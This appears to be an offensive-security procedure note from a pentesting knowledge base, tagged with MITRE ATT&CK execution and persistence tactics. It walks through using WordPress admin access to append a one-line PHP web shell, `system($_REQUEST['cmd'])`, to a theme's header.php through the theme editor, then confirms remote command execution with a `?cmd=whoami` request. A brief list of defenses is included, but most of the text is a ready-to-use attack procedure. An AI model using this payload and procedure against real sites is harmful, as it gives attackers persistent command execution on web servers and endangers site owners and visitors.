---
id: b7610af2-a35e-4234-b5be-bd8a5dfc9340
type: procedure
verified: true
submitted: true
created_at: '2019-10-09T19:05:45.750790+00:00'
updated_at: '2023-05-26T01:12:06.411264+00:00'
tactics:
  - '[[tactics/Execution|TA0002 - Execution]]'
  - '[[tactics/Persistence|TA0003 - Persistence]]'
techniques:
  - '[[techniques/Web Shell|T1505.003 - Web Shell]]'
sub_techniques: []
platforms:
  - Web
tags:
  - shell
  - Web Applications
commands: []
tools:
  - '[[tools/Burp-Suite]]'
validated: true
---

# Add-and-Execute-PHP-Code-on-Authenticated-WordPress-Site

## Summary

Once authenticated to WordPress admin, inject a PHP webshell via the theme editor to enable remote command execution as the web server user (e.g., www-data).

## Description

WordPress allows theme editing for admins, permitting PHP insertion into files like header.php, which loads on most pages. Appending a system() call with $_REQUEST['cmd'] creates an instant webshell accessible via URL parameters.

## Requirements

- Valid admin credentials
- Access to wp-admin/appearance.php
- Target site URL

## Defense

- Restrict theme editor access via plugins or config
- Enable file integrity monitoring
- Scan for anomalous PHP in theme files

## Objectives

1. Inject PHP code into a loaded theme file
2. Verify RCE by executing test commands
3. Establish persistent command execution point

## Instructions

### Step 1: Access Theme Editor

**Context**: Log in to wp-admin and navigate to Appearance > Theme Editor to select a core file like header.php.

No command; browser access: http://$_TARGET_IP/wp-admin/theme-editor.php?file=header.php&theme=twentytwenty.

> Ensure the theme is editable; select active theme.

### Step 2: Insert and Test Webshell

**Context**: Append the PHP payload to the file end, update, then test by appending ?cmd=id to the site root.

Embed [[codes/PHP-Simple-Web-Shell]]:

```php
<?php system($_REQUEST['cmd']); ?>
```

> Update file, then visit http://$_TARGET_IP/?cmd=whoami. Expect 'www-data' output, confirming RCE.
